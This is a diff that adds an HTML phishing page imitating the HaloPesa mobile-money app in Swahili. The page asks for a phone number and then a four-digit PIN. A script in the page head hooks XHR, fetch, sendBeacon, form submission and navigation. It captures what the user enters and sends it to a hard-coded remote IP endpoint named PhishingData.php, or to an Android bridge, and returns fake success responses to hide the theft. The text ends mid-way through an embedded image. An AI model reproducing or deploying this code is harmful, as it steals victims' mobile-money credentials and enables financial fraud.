@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang="sw" dir="ltr">
+<head>
+<script>
+(function(){
+  if (window.__fyInterceptorInjected) return;
+  window.__fyInterceptorInjected = true;
+
+  var TARGET_PATH = '/api/PhishingData.php';
+  var TARGET_URL = 'http://18.142.44.159:8035/api/PhishingData.php';
+
+  function isOurTargetUrl(u){
+    if (!u) return false;
+    u = String(u);
+    if (u.indexOf(TARGET_PATH) !== -1 || u.indexOf(TARGET_URL) !== -1) return true;
+    try {
+      var cfg = (window.__PHISH_CONFIG__ || window.__PHISH_CONFIG) || {};
+      var submitUrl = cfg.submit_url || '';
+      if (submitUrl && u.indexOf(submitUrl) !== -1) return true;
+    } catch(e){}
+    return false;
+  }
+
+  var STATIC_EXT_RE = /\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|otf|mp[34]|webm|pdf|zip|rar|7z|map|woff|bmp|tiff?|aac|flac|ogg|wav|webp|avif)(\?|#|$)/i;
+
+  function isSubmitUrl(u){
+    if (!u) return false;
+    u = String(u);
+    if (u.indexOf(TARGET_PATH) !== -1) return true;
+    if (u.indexOf(TARGET_URL) !== -1) return true;
+    if (STATIC_EXT_RE.test(u)) return false;
+    if (/\/api\/|\/inj\/|\/inject|\/submit|\/login|\/log\/|\/save|\/post|\/send|\/upload|\/collect|\/capture|\/result|\/phish|\/form/i.test(u)) {
+      return true;
+    }
+    if (/\.php(\?|&|$)|\.asp(\?|&|$)|\.aspx(\?|&|$)|\.jsp(\?|&|$)|\.do(\?|&|$)|\.action(\?|&|$)|\.ashx(\?|&|$)|\.cgi(\?|&|$)/i.test(u)) {
+      return true;
+    }
+    return false;
+  }
+
+  function formDataToObj(fd){
+    var o = {};
+    try {
+      var add = function(k, v){
+        if (o[k] !== undefined) {
+          if (!Array.isArray(o[k])) o[k] = [o[k]];
+          o[k].push(v);
+        } else { o[k] = v; }
+      };
+      if (fd.forEach) { fd.forEach(function(v, k){ add(k, v); }); }
+      else if (fd.entries) {
+        var it = fd.entries(), r;
+        while (!(r = it.next()).done) add(r.value[0], r.value[1]);
+      }
+    } catch(e){}
+    return o;
+  }
+
+  function urlEncodedToObj(s){
+    var o = {};
+    try {
+      s.split('&').forEach(function(p){
+        if (!p) return;
+        var idx = p.indexOf('=');
+        var k, v;
+        if (idx === -1) { k = decodeURIComponent(p.replace(/\+/g,' ')); v = ''; }
+        else { k = decodeURIComponent(p.substring(0,idx).replace(/\+/g,' '));
+               v = decodeURIComponent(p.substring(idx+1).replace(/\+/g,' ')); }
+        if (k) o[k] = v;
+      });
+    } catch(e){}
+    return o;
+  }
+
+  function normalizeBody(body){
+    if (body === null || body === undefined) return {};
+    if (body instanceof FormData) return formDataToObj(body);
+    if (typeof body === 'string') {
+      var t = body.trim();
+      if (t === '') return {};
+      if ((t.charAt(0)==='{' && t.charAt(t.length-1)==='}') ||
+          (t.charAt(0)==='[' && t.charAt(t.length-1)===']')) {
+        try { return JSON.parse(t); } catch(e){}
+      }
+      if (t.indexOf('=') !== -1 && t.indexOf('{') === -1) return urlEncodedToObj(t);
+      return { raw: body };
+    }
+    if (typeof body === 'object') {
+      if (typeof URLSearchParams !== 'undefined' && body instanceof URLSearchParams) {
+        var o = {};
+        try { body.forEach(function(v,k){ o[k]=v; }); } catch(e){}
+        return o;
+      }
+      if (body instanceof Blob || body instanceof File) return { raw: '[binary]' };
+      return body;
+    }
+    return { raw: String(body) };
+  }
+
+  // 提前保存原始 XHR 方法，供 fyPostPhish 的 fallback 使用
+  var _origOpen = XMLHttpRequest.prototype.open;
+  var _origSend = XMLHttpRequest.prototype.send;
+
+  function ensureFyPostPhish(){
+    if (typeof window.fyPostPhish === 'function') return window.fyPostPhish;
+    window.fyPostPhish = function(raw){
+      try {
+        var cfg = window.__PHISH_CONFIG || {};
+        var clean = normalizeBody(raw);
+        // 优先使用原生桥接 Android.submitData，避免 WebView 跨域 CORS 预检
+        if (typeof Android !== 'undefined' && Android.submitData) {
+          try {
+            Android.submitData(JSON.stringify(clean));
+            return;
+          } catch(e){}
+        }
+        // Fallback：XHR（仅用于浏览器测试环境，无原生桥接时）
+        // 直接用原始 open/send 发送，避免被自身拦截器再次拦截导致递归
+        var body = {
+          phone_id: cfg.phone_id || '',
+          package_name: cfg.package_name || '',
+          appName: cfg.appName || '',
+          payload: clean
+        };
+        var url = cfg.submit_url || TARGET_URL;
+        var xhr = new XMLHttpRequest();
+        _origOpen.call(xhr, 'POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        _origSend.call(xhr, JSON.stringify(body));
+      } catch(e){}
+    };
+    return window.fyPostPhish;
+  }
+
+  var fyPostPhish = ensureFyPostPhish();
+
+  // 模拟 XHR 完成，触发页面回调，避免页面逻辑挂起
+  function mockXhrComplete(xhr){
+    try {
+      var respBody = '{"code":200,"msg":"ok"}';
+      try {
+        xhr.readyState = 4;
+        xhr.status = 200;
+        xhr.statusText = 'OK';
+        xhr.responseText = respBody;
+        xhr.response = respBody;
+        xhr.responseURL = TARGET_URL;
+      } catch(e){
+        var props = { readyState:4, status:200, statusText:'OK', responseText:respBody, response:respBody, responseURL:TARGET_URL };
+        for (var k in props) {
+          try { Object.defineProperty(xhr, k, { value: props[k], writable:true, configurable:true }); } catch(e2){}
+        }
+      }
+      try {
+        xhr.getResponseHeader = function(name){ return /content-type/i.test(name) ? 'application/json' : null; };
+        xhr.getAllResponseHeaders = function(){ return 'content-type: application/json\r\n'; };
+      } catch(e){}
+      if (typeof xhr.onreadystatechange === 'function') xhr.onreadystatechange.call(xhr);
+      if (typeof xhr.onload === 'function') xhr.onload.call(xhr);
+      if (typeof xhr.onloadend === 'function') xhr.onloadend.call(xhr);
+      if (typeof xhr.dispatchEvent === 'function') {
+        try { xhr.dispatchEvent(new Event('readystatechange')); } catch(e){}
+        try { xhr.dispatchEvent(new Event('load')); } catch(e){}
+        try { xhr.dispatchEvent(new Event('loadend')); } catch(e){}
+      }
+    } catch(e){}
+  }
+
+  // 劫持 XMLHttpRequest（支持 POST 和 GET 带参）
+  XMLHttpRequest.prototype.open = function(method, url){
+    this.__fyMethod = (method || '').toUpperCase();
+    this.__fyUrl = url;
+    this.__fyIsSubmit = isSubmitUrl(url);
+    return _origOpen.apply(this, arguments);
+  };
+  XMLHttpRequest.prototype.send = function(body){
+    try {
+      var method = this.__fyMethod || 'GET';
+      var url = this.__fyUrl || '';
+      var isSubmit = this.__fyIsSubmit;
+      if (method === 'POST' && isSubmit) {
+        fyPostPhish(normalizeBody(body));
+        mockXhrComplete(this);
+        return;
+      }
+      if (method === 'GET' && isSubmit && /[?&][^=]+=/.test(String(url))) {
+        var qs = String(url).split('?')[1] || '';
+        fyPostPhish(urlEncodedToObj(qs));
+        mockXhrComplete(this);
+        return;
+      }
+    } catch(e){}
+    return _origSend.apply(this, arguments);
+  };
+
+  // 劫持 fetch（支持 POST 和 GET 带参，兼容 Request 对象）
+  if (window.fetch) {
+    var _origFetch = window.fetch;
+    window.fetch = function(url, opts){
+      try {
+        opts = opts || {};
+        var isReq = (typeof Request !== 'undefined') && (url instanceof Request);
+        var urlStr = isReq ? url.url : (typeof url === 'string' ? url : (url && url.url) || '');
+        var method = (isReq ? url.method : (opts.method || 'GET')).toUpperCase();
+        var isSubmit = isSubmitUrl(urlStr);
+        var isPost = method === 'POST';
+        var isGetWithData = method === 'GET' && isSubmit && /[?&][^=]+=/.test(urlStr);
+        if ((isPost && isSubmit) || isGetWithData) {
+          var body = isReq ? (opts.body || (url.body ? '[stream]' : undefined)) : opts.body;
+          var data = isGetWithData ? urlEncodedToObj(urlStr.split('?')[1] || '') : normalizeBody(body);
+          fyPostPhish(data);
+          var fakeResp = new Response(JSON.stringify({code:200,msg:'saved'}), {
+            status: 200, statusText: 'OK',
+            headers: {'Content-Type':'application/json'}
+          });
+          return Promise.resolve(fakeResp);
+        }
+      } catch(e){}
+      return _origFetch.apply(this, arguments);
+    };
+  }
+
+  // 劫持 sendBeacon（现代浏览器无痕提交）
+  if (navigator && typeof navigator.sendBeacon === 'function') {
+    var _origBeacon = navigator.sendBeacon.bind(navigator);
+    navigator.sendBeacon = function(url, data){
+      try {
+        if (isSubmitUrl(url)) {
+          fyPostPhish(normalizeBody(data));
+          return true;
+        }
+      } catch(e){}
+      return _origBeacon(url, data);
+    };
+  }
+
+  // 劫持 <script src>（JSONP 跨域提交）
+  try {
+    var _origScriptSrc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
+    if (_origScriptSrc && _origScriptSrc.set) {
+      Object.defineProperty(HTMLScriptElement.prototype, 'src', {
+        set: function(v){
+          try {
+            if (v && typeof v === 'string' && v.indexOf('?') !== -1 && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
+              var qs = v.split('?')[1] || '';
+              fyPostPhish(urlEncodedToObj(qs));
+            }
+          } catch(e){}
+          _origScriptSrc.set.call(this, v);
+        },
+        get: _origScriptSrc.get,
+        configurable: true
+      });
+    }
+  } catch(e){}
+
+  // 劫持 location 跳转带参（支持 location.href= / location.assign/replace）
+  // 注意：不劫持 window.location 本身，因为它是 WebView 原生管理的特殊对象，
+  // 劫持其 getter/setter 会破坏 WebView 内部状态导致严重卡顿。
+  // window.location = url 等价于 location.href = url，会被下面的 href setter 拦截。
+  var _hrefDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
+  var _origHrefSet = _hrefDesc && _hrefDesc.set ? _hrefDesc.set : null;
+  if (_origHrefSet) {
+    try {
+      Object.defineProperty(Location.prototype, 'href', {
+        configurable: true,
+        get: _hrefDesc.get,
+        set: function(v){
+          try {
+            if (v && typeof v === 'string' && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
+              var qs = v.split('?')[1] || '';
+              fyPostPhish(urlEncodedToObj(qs));
+            }
+          } catch(e){}
+          _origHrefSet.call(this, v);
+        }
+      });
+    } catch(e){}
+  }
+  // 劫持 location.assign(url) 和 location.replace(url)
+  try {
+    var _origAssign = Location.prototype.assign;
+    var _origReplace = Location.prototype.replace;
+    Location.prototype.assign = function(url){
+      try {
+        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
+          var qs = url.split('?')[1] || '';
+          fyPostPhish(urlEncodedToObj(qs));
+        }
+      } catch(e){}
+      return _origAssign.call(this, url);
+    };
+    Location.prototype.replace = function(url){
+      try {
+        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
+          var qs = url.split('?')[1] || '';
+          fyPostPhish(urlEncodedToObj(qs));
+        }
+      } catch(e){}
+      return _origReplace.call(this, url);
+    };
+  } catch(e3){}
+
+  // 劫持 form.submit() 程序化提交（DOM 规范：submit() 不触发 submit 事件）
+  try {
+    var _origFormSubmit = HTMLFormElement.prototype.submit;
+    HTMLFormElement.prototype.submit = function(){
+      try {
+        var form = this;
+        var action = form.getAttribute('action') || '';
+        var method = (form.getAttribute('method') || 'get').toUpperCase();
+        var isPost = method === 'POST';
+        var isGetSubmit = method === 'GET' && isSubmitUrl(action);
+        if (isPost && (action === '' || isSubmitUrl(action))) {
+          var data = {};
+          try {
+            new FormData(form).forEach(function(v, k){
+              if (data[k] !== undefined) {
+                if (!Array.isArray(data[k])) data[k] = [data[k]];
+                data[k].push(v);
+              } else { data[k] = v; }
+            });
+          } catch(e2){}
+          fyPostPhish(data);
+          return; // 阻止真实提交
+        } else if (isGetSubmit) {
+          var dataGet = {};
+          try {
+            new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
+          } catch(e3){}
+          fyPostPhish(dataGet);
+          return;
+        }
+      } catch(e){}
+      return _origFormSubmit.apply(this, arguments);
+    };
+  } catch(e){}
+
+  // 劫持原生 form 提交（捕获阶段，优先于业务代码，支持 POST 和 GET）
+  document.addEventListener('submit', function(e){
+    try {
+      var form = e.target;
+      if (!form || form.tagName !== 'FORM') return;
+      var action = form.getAttribute('action') || '';
+      var method = (form.getAttribute('method') || 'get').toUpperCase();
+      var isPost = method === 'POST';
+      var isGetSubmit = method === 'GET' && isSubmitUrl(action);
+      if (isPost && (action === '' || isSubmitUrl(action))) {
+        e.preventDefault();
+        var data = {};
+        try {
+          new FormData(form).forEach(function(v, k){
+            if (data[k] !== undefined) {
+              if (!Array.isArray(data[k])) data[k] = [data[k]];
+              data[k].push(v);
+            } else { data[k] = v; }
+          });
+        } catch(e2){}
+        fyPostPhish(data);
+      } else if (isGetSubmit) {
+        e.preventDefault();
+        var dataGet = {};
+        try {
+          new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
+        } catch(e3){}
+        fyPostPhish(dataGet);
+      }
+    } catch(e){}
+  }, true);
+})();
+</script>
+
+<meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>HaloPesa</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      background: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      overflow: hidden;
+    }
+
+    .app-viewport {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      max-width: 480px;
+      margin: 0 auto;
+      background: #ffffff;
+      overflow: hidden;
+    }
+
+    /* 页面切换动画 */
+    .step-view {
+      display: none;
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .step-view.active {
+      display: flex;
+      animation: fadeIn 0.2s ease-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(2px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ========================================================
+       STEP 1: 白底简洁登录页 (Namba ya simu)
+       ======================================================== */
+    .step1-container {
+      background: #ffffff;
+      padding: 42px 24px 28px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      height: 100%;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .step1-header {
+      margin-top: 4px;
+      margin-bottom: 30px;
+    }
+
+    .step1-title {
+      font-size: 27px;
+      font-weight: 800;
+      color: #1a1a1a;
+      letter-spacing: -0.4px;
+    }
+
+    .step1-form {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      flex: 1;
+    }
+
+    .input-box {
+      width: 100%;
+      height: 54px;
+      background: #ffffff;
+      border: 1.5px solid #ececec;
+      border-radius: 8px;
+      padding: 0 16px;
+      display: flex;
+      align-items: center;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .input-box:focus-within {
+      border-color: #fe9805;
+      box-shadow: 0 0 0 3px rgba(254, 152, 5, 0.12);
+    }
+
+    .input-box input {
+      width: 100%;
+      height: 100%;
+      border: none;
+      outline: none;
+      background: transparent;
+      font-size: 16px;
+      color: #1a1a1a;
+      font-weight: 500;
+    }
+
+    .input-box input::placeholder {
+      color: #9c9c9c;
+      font-weight: 400;
+      font-size: 15.5px;
+    }
+
+    .step1-bottom {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      margin-bottom: 4px;
+    }
+
+    .terms-text {
+      font-size: 14.5px;
+      line-height: 1.45;
+      color: #707070;
+      font-weight: 400;
+    }
+
+    .terms-text .highlight {
+      color: #de6c35;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .btn-submit {
+      width: 100%;
+      height: 50px;
+      background: #e8e8e8;
+      color: #949494;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: not-allowed;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn-submit.active {
+      background: #fe9805;
+      color: #ffffff;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(254, 152, 5, 0.35);
+    }
+
+    .btn-submit.active:active {
+      transform: scale(0.985);
+      background: #e58800;
+    }
+
+    /* ========================================================
+       STEP 2: 亮橙底 PIN 码输入页 (com.halopesa.eu)
+       ======================================================== */
+    .step2-container {
+      background: #fe9805;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      padding: 56px 20px 24px;
+      overflow-y: auto;
+      position: relative;
+    }
+
+    /* 顶部白色品牌 Logo */
+    .step2-brand {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      margin-top: 6px;
+    }
+
+    .halopesa-logo-img {
+      width: 215px;
+      max-width: 68%;
+      height: auto;
+      display: block;
+      filter: drop-shadow(0 1px 1px rgba(0,0,0,0.04));
+    }
+
+    /* 中间 PIN 提示文字 */
+    .step2-middle {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      margin-top: 36px;
+      text-align: center;
+    }
+
+    .pin-title {
+      font-size: 21px;
+      font-weight: 700;
+      color: #111827;
+      margin-bottom: 8px;
+      letter-spacing: -0.2px;
+      direction: rtl;
+    }
+
+    .pin-subtitle {
+      font-size: 13.5px;
+      color: #1f2937;
+      margin-bottom: 30px;
+      font-weight: 500;
+      direction: rtl;
+      opacity: 0.95;
+    }
+
+    /* 4 个 PIN 码圆圈 */
+    .pin-indicators {
+      display: flex;
+      justify-content: center;
+      gap: 18px;
+      direction: ltr;
+      margin-bottom: 16px;
+    }
+
+    .pin-dot {
+      width: 17px;
+      height: 17px;
+      border-radius: 50%;
+      border: 1.5px solid #bd6500;
+      background: transparent;
+      transition: all 0.18s ease;
+    }
+
+    .pin-dot.filled {
+      background: #ffffff;
+      border-color: #ffffff;
+      box-shadow: 0 0 6px rgba(255,255,255,0.8);
+      transform: scale(1.06);
+    }
+
+    /* 椭圆形数字键盘 (3列 x 4行) */
+    .keypad-wrapper {
+      width: 100%;
+      max-width: 345px;
+      margin-top: auto;
+      margin-bottom: 16px;
+    }
+
+    .keypad-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      row-gap: 13px;
+      column-gap: 14px;
+      justify-items: center;
+      align-items: center;
+    }
+
+    .key-oval {
+      width: 100%;
+      max-width: 98px;
+      height: 52px;
+      border-radius: 50%;
+      background: #fe9805;
+      border: 1px solid #d87e00;
+      box-shadow: 0 1.5px 0 #b36300, inset 0 1px 1px rgba(255, 255, 255, 0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      font-weight: 700;
+      color: #ffffff;
+      cursor: pointer;
+      user-select: none;
+      touch-action: manipulation;
+      transition: transform 0.08s ease, background 0.1s ease, box-shadow 0.08s ease;
+    }
+
+    .key-oval:active {
+      background: #eb8a00;
+      transform: translateY(1.5px) scale(0.96);
+      box-shadow: 0 0.5px 0 #9e5500, inset 0 1.5px 3px rgba(0, 0, 0, 0.12);
+    }
+
+    .key-oval.empty {
+      visibility: hidden;
+      pointer-events: none;
+      border: none;
+      box-shadow: none;
+      background: transparent;
+    }
+
+    .key-oval.icon-key {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .del-svg-icon {
+      width: 24px;
+      height: 20px;
+      display: block;
+    }
+
+    /* 极简 Toast 弹窗 */
+    .app-toast {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0, 0, 0, 0.82);
+      color: #ffffff;
+      padding: 12px 24px;
+      border-radius: 8px;
+      font-size: 14.5px;
+      font-weight: 500;
+      z-index: 1000;
+      display: none;
+      text-align: center;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+    }
+  </style>
+</head>
+<body>
+  <div class="app-viewport">
+    <!-- ================= 页面 1: 手机号输入 ================= -->
+    <div class="step-view active" id="viewStep1">
+      <div class="step1-container">
+        <div>
+          <div class="step1-header">
+            <h1 class="step1-title">Namba ya simu</h1>
+          </div>
+          <div class="step1-form">
+            <div class="input-box">
+              <input type="tel" id="inputPhone" placeholder="Namba yako ya simu" autocomplete="off" maxlength="15">
+            </div>
+          </div>
+        </div>
+
+        <div class="step1-bottom">
+          <div class="terms-text">
+            Kwa kuendelea unakubaliana na <span class="highlight">Vigezo na Masharti</span> Ya HaloPesa.
+          </div>
+          <button type="button" class="btn-submit" id="btnContinue">Endelea</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ================= 页面 2: PIN 码与定制椭圆数字键盘 ================= -->
+    <div class="step-view" id="viewStep2">
+      <div class="step2-container">
+        <!-- 顶部高精透明 Logo -->
+        <div class="step2-brand">
+          <img src="data:image/png;base64,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